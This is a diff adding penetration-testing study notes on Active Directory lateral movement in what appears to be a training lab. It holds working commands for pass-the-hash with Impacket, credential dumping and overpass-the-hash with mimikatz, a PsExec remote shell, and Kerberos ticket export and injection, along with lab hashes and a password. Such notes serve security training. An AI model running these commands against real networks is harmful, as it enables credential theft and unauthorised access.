@@ -2625,8 +2625,50 @@ HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"`
     C:\Windows\system32>whoami
     ```
 - Pass the Hash
+  - 3 prerequisites: SMB port 445, Windows File, Printer Sharing, ADMIN$  
+  - Passing the hash using Impacket wmiexec (local administrator account on FILES04)  
+    `kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73`
 - Overpass the Hash
+  - goal: turn the NTLM hash into a Kerberos ticket and avoid the use of NTLM authentication
+  - Log in to the Windows 10 **CLIENT76** as 'jeff' and run a process as jen:Nexus123!
+  - Run notepad as different user 'jen'
+  - Dumping password hash for 'jen' > 369def79d8372408bf6e93364cc93075  
+    `C:\tools>.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit > samdump.txt`
+  - Creating a process with a different user's NTLM password hash  
+    `mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell`  
+    Running the whoami command on the newly created PowerShell session would show jeff's identity instead of jen  
+  - Listing Kerberos tickets  
+    `PS C:\Windows\system32> klist`  
+    No Kerberos tickets have been cached, but this is expected since jen has not yet performed an interactive login
+  - Mapping a network share on a remote server  
+    `PS C:\Windows\system32> net use \\files04`  
+  - Listing Kerberos tickets  
+    `PS C:\Windows\system32> klist`
+    Server: krbtgt/CORP.COM @ CORP.COM
+    Server: cifs/files04 @ CORP.COM  
+  - We have now converted our NTLM hash into a Kerberos TGT  
+  - Opening remote connection using Kerberos  
+    `PS C:\tools\SysinternalsSuite> .\PsExec.exe \\files04 cmd`  
+    C:\Windows\system32>hostname    //successfully reused the Kerberos TGT to launch a command shell on the files04 server  
 - Pass the Ticket
+  - log in as jen to CLIENT76 and unable to access the resource on Web04 (but Dave do)  
+    ```
+    PS C:\Windows\system32> ls \\web04\backup
+    ls : Access to the path '\\web04\backup' is denied.
+    ```
+  - Exporting Kerberos TGT/TGS to disk  
+    ```
+    mimikatz #privilege::debug
+    mimikatz #sekurlsa::tickets /export
+    ```
+  - verify newly generated tickets with dir, filtering out on the kirbi extension >  [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi  
+    `PS C:\Tools> dir *.kirbi`
+  - just pick any TGS ticket in the dave@cifs-web04.kirbi format  
+    `mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi`
+  - Inspecting the injected ticket in memory > Server: cifs/web04 @ CORP.COM  
+    `klist`
+  - Accessing the shared folder through the injected ticket  
+    `PS C:\Tools> ls \\web04\backup`  
 - DCOM
 - Golden Ticket
 - Shadow Copies
